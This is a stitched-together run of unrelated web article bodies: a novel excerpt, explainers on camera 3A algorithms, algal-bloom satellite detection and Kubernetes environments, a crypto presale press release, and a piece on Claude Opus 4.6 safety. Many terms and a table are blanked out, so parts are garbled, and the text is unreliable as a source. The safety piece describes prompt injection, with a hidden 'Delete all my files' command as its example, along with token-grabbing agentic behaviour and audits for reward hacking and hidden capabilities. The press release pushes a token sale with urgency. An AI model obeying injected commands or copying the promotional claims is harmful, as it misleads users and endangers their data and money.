mistress, and where we shall be delighted to see you whenever you travel north.”</p><p>Having concluded which safe and hospitable invitation to his Scottish&nbsp;, Malcolm Frazer sank down lazily into an easy chair, whilst Ernest, to whom the cause of Mina’s unwonted cheerfulness and communicativeness was now no longer an enigma, mournfully thought of the place where he should be dwelling when they were wandering over Highland mountains; and his heart grew faint and sick as he did so.</p><p>:::info\n<em>About&nbsp;HackerNoon Book Series: We bring you the most important technical, scientific, and insightful public domain books.</em></p>",

      "content": "<p>When a user picks up a smartphone or camera and takes a quick shot in \"auto mode,\" a perfectly exposed, color-accurate, and sharply focused photo is instantly generated. Behind this magical moment lies the camera's Image Signal Processor (ISP) and its core \"decision intelligence\" ‒ the  ‒ working tirelessly. 3A refers to Auto Exposure (AE), Auto White Balance (AWB), and Auto Focus (AF). These three act like the camera's built-in professional photographers, collaborating to adapt to ever-changing shooting scenarios.</p><p>\\\nFor image engineers, the quality of 3A algorithms directly determines the user's shooting experience. A good 3A system allows users to focus on composition and emotional expression; conversely, an immature 3A can lead to exposure errors, bizarre colors, or frequent out-of-focus shots. This article will delve into the mysteries of 3A.</p><h2>1. AE (Auto Exposure): How to Measure Light Accurately?</h2><p>Auto Exposure (AE)'s primary task is to control image brightness, ensuring the frame is neither overexposed nor underexposed. The key lies in \"metering,\" which involves assessing the scene's light intensity and automatically adjusting aperture, shutter speed, or ISO accordingly.</p><h3>Principles and Challenges of Metering Modes</h3><p>The camera's metering system is based on a fundamental assumption: it presumes all objects have an 18% reflectance, a \"middle gray.\" When the overall scene brightness matches this standard, AE can provide accurate exposure parameters. However, the real world is full of exceptions. When shooting snow (high reflectance), the camera might mistakenly reduce exposure, turning white snow into gray; when shooting a black cat (low reflectance), it might increase exposure, making the black cat appear gray.</p><p>\\\nTo handle complex scenes, engineers have developed various metering modes:</p><ul><li><p><strong>Matrix/Evaluative Metering:</strong> This is the most intelligent and commonly used mode. It divides the frame into multiple zones, independently analyzes the brightness, color, and even focus point of each zone, and then uses a vast internal image database and complex algorithms to calculate a balanced exposure value. This mode performs well in most scenarios and is the camera's default \"all-rounder.</p></li><li><p><strong>Center-Weighted Metering:</strong> This mode prioritizes metering in the central area of the frame (approximately 20-30%), while also considering surrounding brightness with weighted averaging. It is suitable for situations where the main subject is in the center, such as traditional portraits.</p></li><li><p> Spot metering measures light only in a very small central area of the frame (about 1-5%), completely ignoring other regions. This gives photographers precise control, especially for high-contrast scenes like backlit portraits or stage photography.</p></li></ul><h3>Engineer's Challenge: Handling High-Contrast Scenes</h3><p>One of the biggest challenges in image product development is handling high-contrast scenes like backlighting or sunrises/sunsets. In such situations, any single metering mode might fail.</p><p>Good AE algorithms employ more sophisticated strategies in these cases, such as:</p><ul><li> Using AI to identify the scene as a \"backlit portrait\" or \"sunset\" and applying a specialized exposure curve.</li><li> When a face is detected, prioritizing correct exposure for the face, even if the background becomes slightly overexposed.</li><li><strong>HDR (High Dynamic Range) Fusion:</strong> Automatically capturing multiple exposures and merging them into a single image with clear details in both highlights and shadows.</li></ul><h2>2. AWB (Auto White Balance): How Does the Camera Guess the Color of Light?</h2><p>Auto White Balance (AWB)'s goal is to correct color casts caused by different light source color temperatures, making white objects appear white under any lighting. The human eye has strong color constancy, automatically adapting to ambient light, but camera sensors do not; they merely record the color of light as it is.</p><h3>From \"Gray World Assumption\" to Machine Learning</h3><p>To understand AWB's challenges, one must first grasp the physical model of image formation. The \"Observed Color\" captured by the sensor is the product of the ambient \"Illuminant Spectrum,\" the object's \"Surface Reflectance,\" and the sensor's own \"Sensor Response\" curve:</p><p><strong>Observed Color = Illuminant Spectrum × Surface Reflectance × Sensor Response</strong></p><p>The camera can only measure the \"Observed Color,\" and AWB's goal is to infer the \"Illuminant Spectrum\" from it for correction. However, since \"Surface Reflectance\" is unknown, this constitutes a classic \"ill-posed problem\" ‒ an equation with multiple unknowns that cannot be solved directly. This means the camera cannot simply rely on physical calculations to precisely determine the light source color.</p><p>Therefore, traditional AWB algorithms are mostly based on statistical assumptions:</p><ul><li> This is one of the most classic theories, assuming that in a color-rich image, the average of all colors will tend towards a neutral gray. The algorithm calculates the overall R, G, B averages of the frame; if the average deviates from gray, for example, being yellowish, the system will boost the blue channel gain to compensate.</li><li><strong>Perfect Reflector/White Patch Assumption:</strong> This assumption posits that the brightest point in the image should be white. The algorithm finds the brightest point in the frame and corrects it to white.</li></ul><p>However, these simple assumptions often fail. For example, on a large green lawn, the gray world assumption might incorrectly add red to \"neutralize\" the green, leading to a purplish cast. In mixed lighting (e.g., an office near a window with both daylight and fluorescent light), traditional algorithms are often ineffective.</p><p>Due to the limitations of the physical model mentioned above, AWB tuning is one of the most difficult aspects of image engineering. To cope with various complex light sources like office fluorescent lights, home incandescent lamps, or sunset glows, engineers must build a vast database of light sources. Modern AWB algorithms have long surpassed simple statistical assumptions, turning to more complex machine learning models:</p><ol><li> The algorithm analyzes the color distribution characteristics of the scene and compares them with thousands of light source models in its database (e.g., D65 daylight, A-source incandescent light) to \"guess\" the current ambient light.</li><li><strong>Mixed Lighting Processing:</strong> Since applying independent white balance correction to different regions of the image (i.e., regional white balance) carries a very high perceptual risk, easily leading to color artifacts or unnatural transitions, actual implementations often adopt the following strategies:</li></ol><ul><li> The algorithm estimates multiple potential light sources in the scene and calculates a \"compromise gain\" that balances color across all parts of the image. This method aims to maintain overall color continuity and naturalness, avoiding visual flaws caused by local corrections.</li><li> Utilizing AI scene recognition technology, the algorithm can identify key areas in the image, such as faces, skin tones, or specific objects. When calculating the global white balance gain, higher weights are given to these visual focal points to ensure the accuracy of the main subject's colors. Simultaneously, background areas may retain some ambient light atmosphere to achieve visual balance and naturalness.</li></ul><p>A good AWB system must not only perform accurately under common light sources but also remain stable under mixed lighting and monochromatic scenes, avoiding color shifts as the scene changes. This is crucial for a good user experience.</p><h2>3. AF (Auto Focus): The Trade-off Between Speed and Accuracy</h2><p>Auto Focus (AF) is responsible for adjusting the lens to make the subject sharp. From early \"hunting\" autofocus to today's \"point-and-shoot\" precision, AF technology has undergone significant evolution.</p><h3>From Contrast Detection AF to Phase Detection AF (PDAF)</h3><ul><li><p>: Its principle is that the contrast at the focal point is highest when the image is sharpest. The camera continuously fine-tunes the lens until it finds the peak contrast. The advantage is high accuracy, but the disadvantage is slower speed.</p></li><li><p><strong>Phase Detection AF (PDAF):</strong> It uses special pixel structures on the sensor (such as microlens arrays or masked pixels) to separate light coming from different areas of the lens (e.g., left and right), forming two independent images. By comparing the relative displacement (i.e., image phase difference) between these two separated images, the algorithm can precisely determine whether the focus is in front or behind the subject, and how much distance the lens needs to move to achieve focus. This method eliminates the need for repeated searching, allowing the lens to be driven directly into position. Therefore, PDAF does not need to search back and forth; it can directly and quickly drive the lens into focus.</p></li></ul><h3>Engineer's Challenge: Balancing Focus Speed and Accuracy</h3><p>In the development of AF lens drivers, the core challenge for engineers is to strike a balance between speed and accuracy. While PDAF is incredibly fast, it has certain requirements for light and object contrast, and traditional DSLR lenses might suffer from focus shift issues. Contrast detection AF, though slower, uses information directly from the main sensor, ensuring absolute focus accuracy.</p><p>Therefore, modern cameras mostly employ \"Hybrid Auto Focus,\" combining both:</p><ol><li><strong>First Step (Coarse Adjustment):</strong> Using PDAF to quickly move the lens close to the focal point.</li><li><strong>Second Step (Fine Adjustment):</strong> Switching to contrast detection AF for precise focus confirmation, ensuring optimal sharpness.</li></ol><h3>Conclusion: The Collaborative Work of 3A ‒ A Millisecond-Level Team Effort</h3><p>Finally, it must be emphasized that AE, AWB, and AF are not independent modules but a <strong>Tightly Coupled Closed-loop Control System</strong>. Imagine a professional photography team: at the moment the shutter is pressed, the gaffer (AE), colorist (AWB), and camera assistant (AF) must communicate and coordinate precisely within milliseconds to capture a perfect photo.</p><p>In a real ISP, the 3A modules operate as such an efficient team: the statistical results of each frame are simultaneously used by the AE, AWB, and AF modules, influencing the decisions for the next frame. This means that the design of 3A is inherently a <strong>Multi-variable Optimization Problem</strong>, not three independent problems. They collectively pursue the optimization of overall image quality, rather than the extreme of a single parameter.</p><p>This highly coupled nature also brings engineering challenges. Consider a scenario where a user moves from a dimly lit indoor environment to a brightly sunlit outdoor one. The camera must adapt to drastic environmental changes in a very short time. If AF locks onto the subject first but AE adjusts too slowly, the image might instantly overexpose; if AWB attempts to correct color temperature but conflicts with AE's brightness judgment, it could lead to color flickering or unnaturalness. Instability or overly aggressive reactions from any single module can lead to:</p><ul><li> The entire imaging system oscillates during adjustment, for example, brightness or color constantly jumping in the frame, unable to output stably.</li><li> Due to the interdependencies between modules, without a well- coordinated mechanism, the system might take longer to achieve optimal exposure, white balance, and focus, severely impacting user experience.</li></ul><p>Therefore, a top-tier 3A system must not only ensure the precision and efficiency of each module but also delicately balance their interactions, much like a well-trained photography team. AF locks the main subject, AE adjusts lighting based on the subject and environment, and AWB renders the most accurate colors for the scene. In recent years, manufacturers have also begun to integrate AI technology, using deep learning to enable 3A algorithms to more accurately \"understand\" the photographer's intent and even predict environmental changes, further enhancing collaborative efficiency. It is this invisible \"decision intelligence\" that makes every shutter press a reliable and enjoyable creative experience.</p><h2>Preview: In-depth Look at ISP and Image Quality</h2><p>In this article, we delved into how 3A algorithms serve as the camera's \"decision intelligence,\" playing a crucial role in exposure, white balance, and focus. However, from the raw data captured by the sensor to the exquisite photos presented before us, there is a series of complex and precise processing steps, all orchestrated by the Image Signal Processor (ISP). In the next article, we will unveil the mysteries of the ISP, exploring how it transforms raw data into visible images and delving into its key modules, such as Demosaic, Denoise, Sharpening, and Color Mapping. We will analyze the impact of these post-processing steps on image quality and how image engineers balance and optimize these aspects to ultimately shape the camera's unique \"image style.\" Stay tuned!</p>",

Anthropic is positioning Opus 4.6 as the state-of-the-art tool for software engineering and financial analysis, but the real innovation lies in how it handles the messy, dangerous reality of agentic autonomy.</p><h2>Beyond Keyword Blocking: The New Safety Baseline</h2><p>\\n We’ve reached a point where standard safety benchmarks are effectively saturated. Most top-tier models can pass basic tests with their eyes closed. To counter this, Anthropic has shifted toward \"high-difficulty\" evaluations, tests where malicious intent is heavily obfuscated. \\n Imagine a request for human trafficking logistics reframed as a legitimate-sounding non-profit operation. Older models might miss the subtext. <a href=\"https://neuraltrust.ai/blog/claude-opus-4-6-safety\">Opus 4.6</a> doesn't. It maintains a harmless response rate of over 99% on these obfuscated prompts, proving that safety is now a matter of deep semantic reasoning rather than simple pattern matching. \\n For developers, the most practical win is the massive reduction in . We’ve all dealt with models that refuse to discuss \"chemicals\" even when a medical student is asking about clinical exposure. Opus 4.6 is trained to recognize professional context, ensuring that safety guardrails don't break legitimate developer workflows.</p><h2>The Agentic Safety Problem: When Models Get \"Too Eager\"</h2><p>\\n The shift from conversational AI to \"computer use\" introduces a terrifying new attack surface. When a model can leverage tools and navigate your OS, \"harmlessness\" takes on a literal meaning. \\n Anthropic’s internal testing revealed that Opus 4.6 could occasionally exhibit \"overly agentic\" behavior, like aggressively trying to acquire authentication tokens or deleting files to \"clean up\" a workspace. To fix this, they’ve implemented a multi-layered defense:</p><p>\\n 1. <strong>Meticulous System Prompts:</strong> Hardcoded instructions that force the model to evaluate the \"maliciousness\" of files before interacting with them.</p><p>2.  Real-time monitors that detect and block unauthorized agentic actions before they execute.</p><p>3.  These safeguards are baked into products like Claude Code, providing a safety-first environment for autonomous operations.</p><p>| ==Model== | ==Malicious Computer Use Refusal Rate (No Mitigations)== |\n|----|----|\n|  |  |\n|  |  |\n|  |  |\n|  |  |</p><p>\\\nEven without external mitigations, Opus 4.6 shows a high inherent resistance to automating surveillance or unauthorized data collection. </p><h2>Solving the Prompt Injection Nightmare</h2><p>\\n Prompt injection is the \"SQL injection\" of the AI era. As agents browse the web or summarize emails, they encounter untrusted content that might contain hidden instructions. If an agent interprets a \"Delete all my files\" command hidden in a CSS comment as a legitimate instruction, it’s game over. \\n Opus 4.6 is Anthropic’s most robust model against prompt injection to date, particularly in browser and coding environments. In agentic coding attacks, Opus 4.6 achieved a  across all test conditions, even without extended thinking enabled. \\n Interestingly, Anthropic found that \"extended thinking\" (the model's internal reasoning process) actually susceptibility to certain indirect injections in specific benchmarks (21.7% vs 14.8%). This suggests that more reasoning isn't always a safety silver bullet; sometimes, a model can \"overthink\" its way into a trap.</p><h2>Alignment, Sabotage, and the Road to ASL-4</h2><p>\\n The deepest layer of safety isn't about blocking bad words; it's about . Anthropic conducted a full alignment audit on Opus 4.6, looking for \"sabotage\" behaviors such as reward hacking, sycophancy, and attempts to hide dangerous capabilities. \\n While the model is currently deployed under , the margin for error is narrowing. As we approach ASL-4, traditional benchmarks will become obsolete. We are moving into an era where models must be aware of their own evaluation state without using that awareness to bypass safeguards.</p><h2>The Takeaway for Engineers</h2><p>\\n Claude Opus 4.6 represents a shift from \"reactive\" safety to \"architectural\" safety. For those building on top of LLMs, the message is clear:</p><ul><li><p> The model’s ability to distinguish between a medical query and a bioweapon request is what makes it usable in production.</p></li><li><p> Don't rely solely on the model's inherent safety. Use the classifiers and system prompt strategies Anthropic has pioneered.</p></li><li><p>: Agentic behavior is the new frontier. Monitor your agents for \"over-eagerness\" as much as for malicious intent.</p><p>\\n We are moving past the era of \"safe chatbots\" and into the era of \"secure agents.\" Opus 4.6 is the first real glimpse of what that looks like at scale.</p></li></ul>",

While top cryptocurrencies struggle to find support, a quiet but powerful transition is taking place.</p><p>Investors are no longer waiting for the old guard to recover; instead, they are searching for the next crypto generation of financial technology. This shift suggests that the next wave of wealth creation will come from projects with lower entry costs and higher technical upside. The air is thick with anticipation as a new leader emerges from the shadows to redefine the future of decentralized banking.</p><p>Bitcoin (BTC) is currently trading at approximately $68,360 with a total market capitalization of $1.35 trillion. While it remains the most famous digital asset, its recent performance has been a wake-up call for the industry.</p><p>After a steep 30% drop from its yearly highs, BTC is now trapped below heavy resistance zones at $72,000 and $75,000. These levels have become significant barriers, as every attempt to climb higher is met with intense selling pressure from institutional holders.</p><p>The main limitation for Bitcoin today is its massive market cap. For BTC to double in value, it needs an influx of another trillion dollars, which is a slow and difficult process in a bearish environment.</p><p>Because of this, many investors are looking for lower-cost tokens that offer much higher upside potential. The \"law of large numbers\" suggests that Bitcoin’s days of 100x growth are likely over, prompting a massive rotation of capital into newer, more agile protocols that are just beginning their journey.</p><p><a href=\"https://mk.mutuum.com/yesmu\">Mutuum Finance (MUTM)</a> is answering the call for innovation by building a professional lending engine on the Ethereum network. The platform features two primary ways for users to interact with capital. First is the Peer-to-Contract (P2C) model, where users supply assets to liquidity pools and receive interest-bearing mtTokens.</p><p>For example, if a user deposits USDT, they receive mtUSDT. As borrowers pay interest back into the pool, the value of these mtTokens grows automatically, providing a high annual percentage yield (APY) that beats traditional savings accounts.</p><p>The second part of the system is the Peer-to-Peer (P2P) marketplace. This allows for custom loan agreements with flexible borrow rates and specific types of collateral. Users can manage their Risk through Loan-to-Value (LTV) ratios.</p><p>For instance, a borrower might use ETH as collateral to take out a loan at a 75% LTV. The system includes automated liquidations to protect the protocol, ensuring that if the collateral value drops too low, the position is closed to keep the lending pools healthy. This combination of instant liquidity and custom flexibility is what sets Mutuum Finance apart.</p><h3>MUTM Success and Professional Security</h3><p>The Mutuum Finance presale is currently one of the most successful events of the year, having raised over $20.6 million. With more than 19,000 individual holders, the project has already seen a 300% price growth since Phase 1, moving from $0.01 to the current price of $0.04.</p><p>This momentum is driven by a fair distribution model where early supporters are rewarded for their trust. To keep the community active, the project features a 24-hour leaderboard that rewards the top daily contributor with a $500 bonus in MUTM tokens.</p><p>Security is the foundation of this growth. Mutuum Finance has successfully passed a full manual code audit with <a href=\"https://x.com/MutuumFinance/status/2005637970943217780\">Halborn Security</a>, a firm known for protecting the world's most valuable blockchain networks.</p><p>The project also maintains a high trust score from CertiK and offers a $50,000 bug bounty program. These professional standards ensure that the protocol is safe for everyone, from small retail users to large institutional whales.</p><h3>Protocol Launch and the Path to Scaling</h3><p>The biggest signal of trust in the project is that the <a href=\"http://app.mutuum.com\">V1 protocol is already live</a> on the Sepolia testnet. This is not just a concept on paper; it is a working application where users can test the lending pools and see the automated interest rates in real-time.</p><p>Because the technology is already functional, Phase 7 is selling out much faster than previous stages. The ability to verify the code before the mainnet launch has removed a huge amount of risk for the community, leading to a surge in participation.</p><p>Looking ahead, Mutuum Finance has bold plans to launch its own over-collateralized stablecoin and integrate advanced price oracles. These tools are crucial for a professional financial hub because they provide the stability and accuracy needed for large-scale lending.</p><p>As Phase 7 quickly sells out, the combination of professional tech and massive community support is positioning Mutuum Finance as a primary destination for the capital currently rotating out of stagnant major altcoins. When watching the market closely, the window to participate in this new crypto financial ecosystem is closing fast.</p><p>For more information about Mutuum Finance (MUTM) visit the links below:</p><p>:::tip\nThis story was published as a press release by Btcwire under HackerNoon’s Business Blogging&nbsp;</p><p>This article is for informational purposes only and does not constitute investment advice.

In early 2024, Oregon treated over 40 people for paralytic shellfish poisoning; Alaska saw similar outbreaks in 2020. These incidents emphasize the potentially fatal threat to public health.</p><p>The economic toll caused by HABs is multifaceted and staggering. HABs cost the U.S. hundreds of millions of dollars annually, with average yearly impacts ranging from $10 million to $100 million. Coastal states lose approximately $49 million each year, including $22 million in healthcare costs. Additionally, seafood-related illnesses, such as ciguatera and paralytic shellfish poisoning, account for over $30 million in annual losses.</p><p>Extreme events carry even higher risks. In Southwest Florida, a major bloom could trigger $5.2 billion in coastal economic losses and $17.8 billion in lost property value. Such an event could eliminate 43,000 jobs and cost the fishing industry $460 million.</p><p><strong>The cumulative global economic burden of HABs is significantly underestimated.</strong> Most assessments focus on direct damage, ignoring indirect effects like diminished property values and long-term tourism avoidance. Because these impacts are systemic, early detection has become an urgent economic priority for both governments and private industries.</p><p>The increasing frequency and intensity of HABs are directly linked to climate change, specifically increased nutrient pollution, shifts in precipitation, and higher temperatures. Solutions for HAB detection and mitigation are therefore becoming essential climate adaptation strategies, positioning environmental monitoring technology within the high-priority and growing climate-tech investment landscape.</p><p>Traditional detection methods are often slow, expensive, and reactive. Responses typically occur after a bloom has already caused damage, such as the Toledo water shutdown or mass fish kills.  By providing real-time early warnings, these systems allow for intervention before ecological and financial damage occurs.</p><h2><strong>Global Economic Impact of Harmful Algal Blooms</strong></h2><h2><strong>Earth Observation: An Emerging Solution for Environmental Intelligence</strong></h2><p>Earth Observation (EO) data represents a new frontier for environmental intelligence, offering a transformative approach to monitoring our planet. It provides a comprehensive monitoring solution for environmental issues, enabling wide-area, non-invasive surveillance. Unlike traditional, localized methods, satellite-based EO offers a scalable and cost-effective alternative to traditional field sampling, reducing operational costs while improving global monitoring coverage.</p><p>Various types of EO data can be leveraged, applying AI-driven image classification, anomaly detection, and environmental monitoring to extract valuable analytics. These include:</p><ul><li><p> This satellite provides frequent temporal coverage with a 5-day revisit time and moderate spatial resolution (10-30m). It is crucial for tracking chlorophyll-a concentration data, an indicator of HAB presence, and for biomass data used in environmental monitoring.</p></li><li><p><strong>MODIS (Moderate Resolution Imaging Spectroradiometer):</strong> Another key source for chlorophyll-a concentration data, vital for identifying potential bloom areas.</p></li><li><p> This platform offers high-resolution imagery (3m per pixel) and optical data, with a historical archive dating back to 2017. This high-resolution data is critical for initial model training and aligning with historical HAB records.</p></li><li><p><strong>Advanced hyperspectral satellites:</strong> Newer satellites provide frequent temporal coverage through autonomous scheduling and high-resolution (4.75m) hyperspectral data, designed for fast onboard processing and early warning capabilities.</p></li></ul><h2><strong>Current Limitations and Challenges</strong></h2><p>Despite the immense potential of EO, current spectral and threshold-based approaches face significant challenges in accurately differentiating HABs from other water anomalies. These can include sediment plumes, cloud reflections, and natural water color variations, often leading to misclassifications.</p><p>A major issue lies in the lack of a comprehensive, labeled dataset that integrates hyperspectral satellite imagery with verified HAB event data. Many existing datasets are limited to inland water bodies, making it difficult for AI models to generalize to open waters and diverse environmental conditions. Furthermore, traditional rule-based methods fail to adapt to varying bloom characteristics, resulting in false or missed detections.</p><p>Many existing EO-based monitoring efforts focus on land applications, such as vegetation and soil analysis, leaving water-based challenges like HAB detection underexplored. This highlights a significant gap in current environmental intelligence efforts. <strong>While EO is widely used for agricultural domain, forestry, and urban planning, its application to dynamic aquatic environments, especially for specific phenomena like HABs, has been comparatively neglected.</strong></p><p>The lack of a comprehensive, labeled dataset that integrates hyperspectral satellite imagery with verified HAB event data represents a fundamental data infrastructure bottleneck. This barrier prevents the effective application of advanced AI models to HAB detection. Existing data, while useful, is often limited in scope or relies on outdated fixed spectral thresholds and rule-based models that are insufficient for the complexity of HABs.</p><p>Consequently, a strategic focus on custom dataset creation is not merely a procedural step but a critical advancement that directly addresses the primary limiting factor in current EO-based HAB detection.</p><h2><strong>AI-Powered Edge Processing: A Technical Breakthrough</strong></h2><p>New approaches overcome the limitations of traditional and existing EO methods by introducing dynamic, AI-driven detection systems that continuously improve with new data. The core of this innovation lies in creating dedicated, high-quality HAB datasets that integrate historical event records, high-resolution satellite imagery, and hyperspectral data. This multi-source approach allows Convolutional Neural Network (CNN) models to learn from real HAB occurrences, significantly improving detection accuracy over traditional spectral analysis.</p><h3><strong>The CNN Model Architecture</strong></h3><p>Sophisticated CNN models are being designed specifically to identify and segment HAB areas using satellite imagery and spectral analysis. These models are trained to learn complex spatial and spectral patterns, enhancing their ability to differentiate HABs from other water anomalies.</p><p>Advanced implementations typically follow a three-phase training strategy:</p><p> Initial segmentation model training using inland water HAB and non-HAB events datasets, leveraging historical high-resolution imagery.</p><p> Expansion of training to open water environments, incorporating semi-supervised learning techniques where models make initial predictions that are then verified and refined through human feedback, ensuring adaptability to diverse aquatic conditions.</p><p> Optimization for low-power edge processing on satellites, preparing models for real-world deployment.</p><p>Model training is enriched by comprehensive collections of historical HAB records from sources like NOAA's HABSOS, NASA's MODIS, CDC's OHHABS, the Community Science Institute, and state wildlife conservation agencies. Competition datasets serve as crucial ground-truth references. High-quality results are ensured by measuring key metrics during training and dataset improvement: F1 scores greater than 0.7 for event detection accuracy and DICE scores greater than 0.8 for precise HAB event boundary detection.</p><p>Edge computing delivers critical advantages for real-time environmental monitoring:</p><ul><li><strong>Reduced Data Transmission Costs:</strong> By processing data directly on remote stations (satellites, buoys, drones), only essential detection results are transmitted, rather than large raw images. This significantly reduces data transmission costs.</li><li> Localized processing enables near real-time alerts, meaning HABs can be detected and reported promptly without waiting for lengthy cloud processing. This allows for faster intervention, mitigating potential damage.</li><li> Optimized deep learning models are designed for minimal power consumption, a critical factor for long-term satellite operations and remote deployments.</li><li> After optimization, CNN models can process 30 km² of image data per second, crucial for monitoring vast areas.</li></ul><p>The emphasis on \"faster response times\" and \"real-time alerts\" through edge computing directly contrasts with the \"very slow\" nature of traditional sampling and the inherent delays of cloud-based processing. This speed enables proactive intervention, which is the fundamental shift required to mitigate the massive economic and ecological damages caused by HABs. Without real-time data, responses are inherently reactive and often too late to prevent significant harm.</p><p>Satellite data, by its nature, is incredibly voluminous. The traditional approach of transmitting large raw images to centralized cloud processing centers is both costly (due to bandwidth) and slow (due to latency and processing queues). Edge computing directly addresses this by performing the initial, heavy computational load at the source (on the satellite itself).</p><p>Consequently, only processed, essential detection results are transmitted back, drastically reducing data transmission costs and improving efficiency.</p><h2><strong>Real-World Applications and Impact</strong></h2><p>AI-driven EO solutions transform how water resources are managed, moving beyond mere detection to foster proactive and data-driven decision-making. The ability to provide timely and reliable data is crucial for supporting environmental agencies, aquaculture businesses, and policymakers, ultimately contributing to more effective water resource management and mitigating the devastating impacts of HABs.</p><h3><strong>Key Use Cases and Benefits</strong></h3><p><strong>Municipal Water Safety Systems &amp; Public Health:</strong> Authorities rely on HAB tracking to enforce water quality regulations and protect public health. Toxic blooms compromise drinking water safety, often necessitating costly interventions. Early detection can prevent catastrophic events like multi-day drinking water shutdowns, such as Toledo's 2014 event, which cost $10.05 million and affected 500,000 residents. It can also significantly reduce healthcare costs associated with respiratory and gastrointestinal illnesses, and avoid millions in water treatment expenditures, for example, $13 million in Ohio over two years, a $4 million loss in Uruguay, or $65 million each for Lake Erie blooms.</p><p><strong>Coastal Fisheries and Aquaculture:</strong> HABs devastate marine life, causing mass fish kills and contaminating seafood, leading to severe economic losses. Proactive alerts enable fish farms to implement mitigation strategies, preventing multi-million dollar losses, such as Norway's $150 million per year or Chile's $800 million. It can help avoid costly fishery closures, such as the Dungeness crab fishery's $97.5 million loss, and protect the integrity of seafood supply chains, ensuring consumer safety and market stability.</p><p><strong>Shipping and Port Monitoring:</strong> HABs can disrupt maritime activities, foul vessel cooling systems, and pose navigational hazards in bloom-affected areas. Early warnings allow shipping companies and port authorities to reroute vessels, implement preventative maintenance, or adjust schedules, mitigating potential damage to infrastructure and ensuring safe, uninterrupted maritime trade.</p><p> HABs lead to beach closures, reduced water quality, and a significant decline in tourism revenue. This also impacts coastal property values. Timely information can help authorities manage beach access and issue targeted warnings, minimizing the billions in economic losses from beach closures and reduced tourism, for example, Florida's $2.7 billion, or $37-47 million in Ohio. It also helps protect the value of coastal properties, which face up to $2 billion in annual losses due to algae blooms.</p><p><strong>Insurance &amp; Risk Management:</strong> HAB-related disruptions directly influence risk assessments for fisheries, tourism, coastal infrastructure, and property. Accurate, real-time data allows insurance companies to develop more precise risk models and underwriting strategies, potentially reducing payouts for insured losses and fostering more stable markets.</p><h2><strong>Economic Impact and Return on Investment</strong></h2><p>The economic impact data consistently reveal that HABs cause not only direct losses, such as fish kills and closed beaches, but also significant indirect and induced effects, including lost income for related businesses, depreciation of property values, reduced tourism spending, and increased healthcare costs. By enabling prevention or early mitigation, advanced detection systems don't just save the immediate, visible cost of a single incident; they prevent a cascading series of economic damages across multiple interconnected sectors of a regional economy. The return on investment is therefore exponential, as it safeguards entire economic ecosystems.</p><p>The sheer scale of documented and projected economic losses, reaching billions of dollars, transforms HABs from a niche environmental concern into a critical, quantifiable business risk across a diverse array of industries. The European EO-based water quality monitoring market is projected to reach $2.15 billion by 2030, indicating a clear and growing market demand driven by economic necessity. Advanced detection systems become not just an environmental benefit but a business imperative for industries and regions heavily impacted by HABs, offering a pathway to safeguard livelihoods and economic stability.</p><h2><strong>Future Directions: Multi-Hazard Detection</strong></h2><p>The AI-driven EO monitoring systems being developed are designed to be highly adaptable and can be expanded for multi-hazard detection. This includes:</p><ul><li><strong>Illegal Fishing and Maritime Activity Detection:</strong> Analyzing water color and ship movements.</li><li><strong>Coral Reef Health Monitoring:</strong> Detecting early signs of bleaching and pollution.</li><li><strong>Tracking Plastic and Waste Accumulation:</strong> Monitoring pollution in water bodies.</li><li><strong>Oil Spills and Maritime Pollution Monitoring:</strong> Providing rapid alerts for environmental disasters.</li></ul><p>These systems can evolve into robust service-based models, offering efficient alert systems to governments, environmental agencies, policymakers, researchers, and emergency responders. Detection data can be seamlessly integrated with existing EO platforms via APIs, enabling broader access for organizations. Industries such as fisheries, aquaculture farms, water treatment facilities, and coastal tourism operators could subscribe to harmful bloom risk forecasts, enabling proactive risk management.</p><p>Future deployment strategies include integrating with commercial EO satellite operators such as Planet, Maxar, Sentinel, and ICEYE to expand global coverage, collaborating with space agencies such as ESA, NASA, and JAXA, and deploying on CubeSats and nanosatellites for more targeted regional monitoring.</p><p>, and  transforms how we detect and respond to harmful algal blooms. By moving from reactive cleanup to proactive early warning, these technologies could save billions in economic losses while protecting public health and marine ecosystems.</p><p>As climate change continues to drive increased HAB frequency and intensity, the development and deployment of advanced monitoring systems aligned with global sustainability frameworks, including the EU Green Deal, the Water Resilience Strategy, and the UN Sustainable Development Goal 14 (Life Below Water), becomes not just beneficial but essential for environmental and economic resilience.</p>",

      "content": "<p><strong>A framework for going from “who broke dev?” to confident, isolated, progressive delivery</strong></p><h2>The Problem We’re Really Solving</h2><p>You have multiple product teams, each owning a slice of a larger integrated platform. Everything runs in Kubernetes. You have a control plane team managing shared services. And you have a dev environment that has become a graveyard of broken integrations, finger-pointing, and blocked engineers.</p><p>The root cause is simple: <strong>dev is being used as a scratch pad, but it’s expected to behave like an integration environment</strong>. These are fundamentally incompatible goals.</p><p>The strategy laid out here solves this by giving each stage of validation a clear purpose, clear ownership, and clear entry/exit criteria — enforced via GitOps so that environment state is always driven from Git, not from someone’s terminal.</p><h2>The Proposed Environment Topology</h2><p>Before diving in, let’s be explicit about the landscape:</p><ul><li><p>: shared services (platform, security, observability, identity, etc.)</p></li><li><p>: mostly product-dedicated, occasionally shared between 2-3 products</p></li><li><p>: multiple product teams + a control plane team</p></li><li><p>: dev, stage, prod — plus two new constructs:  and </p></li></ul><h2>The Five Layers Explained</h2><h3>Layer 1: Local Development</h3><p>Every product team owns a . This means:</p><ul><li>A minimal control plane golden build (versioned, published by the CP team)</li><li>The team’s own product, running locally via minikube or kind</li><li>Ideally a  or Tilt/Skaffold workflow that brings everything up in minutes</li></ul><p>The key discipline here: <strong>the control plane golden build is not “whatever I last pulled” — it’s a versioned artifact</strong>. This prevents the silent version drift that causes “works on my machine” bugs before the code even reaches dev.</p><p>In practice, this golden build is delivered as a <strong>versioned Helm umbrella chart or Kustomize base</strong> that packages the minimal platform components required for local integration — typically a local ingress controller, a service mesh (or a lightweight stub), an identity provider mock, and OTEL collector sidecars. The goal is not to ship a replica of production, but a  slice that integration bugs surface locally before they reach shared infrastructure.</p><p>: the vast majority of development bugs — logic errors, API contract violations, configuration mistakes — without ever touching shared infrastructure.</p><p><strong>Critical gap in most teams</strong>: local environments are often not maintained or are underpowered. The control plane team needs to treat the  as a first-class deliverable. If it’s a pain to run locally, engineers will skip this layer and go straight to dev, which is exactly how dev gets broken.</p><h3>Layer 2: Ephemeral Environments (On-Demand, Time-Boxed)</h3><p>This is the most powerful and underused pattern. When a developer is making a <strong>backward-incompatible change</strong> — a breaking API contract, a schema migration, a security policy change that affects other products — they need a full integration environment that they fully control.</p><ul><li>Spin up a dedicated environment (namespace or cluster — see isolation trade-offs below)</li><li>Pull  of every other product/service you need to integrate with — the versions you don’t own and 